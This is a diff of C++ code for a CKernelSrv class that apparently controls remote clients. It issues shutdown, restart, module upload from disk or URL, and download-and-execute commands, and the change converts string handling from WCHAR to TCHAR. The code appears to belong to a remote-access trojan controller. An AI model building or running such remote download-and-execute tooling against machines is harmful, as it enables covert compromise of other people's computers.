@@ -63,9 +63,9 @@ void CKernelSrv::Power_Shutdown()
 {
 	SendMsg(KNEL_POWER_SHUTDOWN, 0, 0);
 }
-void CKernelSrv::EditComment(WCHAR*Comment)
+void CKernelSrv::EditComment(TCHAR*Comment)
 {
-	SendMsg(KNEL_EDITCOMMENT, (char*)Comment,sizeof(WCHAR)*( wcslen(Comment) + 1));
+	SendMsg(KNEL_EDITCOMMENT, (char*)Comment,sizeof(TCHAR)*( lstrlen(Comment) + 1));
 }
 
 void CKernelSrv::Restart()
@@ -73,14 +73,14 @@ void CKernelSrv::Restart()
 	SendMsg(KNEL_RESTART, 0, 0);
 }
 
-void CKernelSrv::UploadModuleFromDisk(WCHAR* Path)
+void CKernelSrv::UploadModuleFromDisk(TCHAR* Path)
 {
-	SendMsg(KNEL_UPLOAD_MODULE_FROMDISK, (char*)Path, sizeof(WCHAR)*(wcslen(Path) + 1));
+	SendMsg(KNEL_UPLOAD_MODULE_FROMDISK, (char*)Path, sizeof(TCHAR)*(lstrlen(Path) + 1));
 }
 
-void CKernelSrv::UploadModuleFromUrl(WCHAR* Url)
+void CKernelSrv::UploadModuleFromUrl(TCHAR* Url)
 {
-	SendMsg(KNEL_UPLOAD_MODULE_FORMURL, (char*)Url,  sizeof(WCHAR)*(wcslen(Url) + 1));
+	SendMsg(KNEL_UPLOAD_MODULE_FORMURL, (char*)Url,  sizeof(TCHAR)*(lstrlen(Url) + 1));
 }
 void CKernelSrv::BeginCmd()
 {
@@ -125,9 +125,9 @@ void CKernelSrv::OnError(TCHAR * Error){
 	SendMessage(m_hClientList, WM_KERNEL_ERROR, (WPARAM)Error, (LPARAM)GetSockName().first.c_str());
 }
 
-void CKernelSrv::BeginDownloadAndExec(WCHAR szUrl[])
+void CKernelSrv::BeginDownloadAndExec(TCHAR szUrl[])
 {
-	SendMsg(KNEL_DOWNANDEXEC, (char*)szUrl, (sizeof(WCHAR)*(wcslen(szUrl) + 1)));
+	SendMsg(KNEL_DOWNANDEXEC, (char*)szUrl, (sizeof(TCHAR)*(lstrlen(szUrl) + 1)));
 }
 
 void CKernelSrv::BeginExit(){
@@ -143,7 +143,7 @@ void CKernelSrv::OnLogin(LoginInfo *pLi){
 	SendMessage(m_hClientList, WM_CLIENT_LOGIN, (WPARAM)this, (LPARAM)pLi);
 }
 
-#define MAX_CHUNK_SIZE 0x4000
+#define MAX_CHUNK_SIZE 0x10000
 
 
 void CKernelSrv::OnGetModuleChunk(char * ChunkInfo){
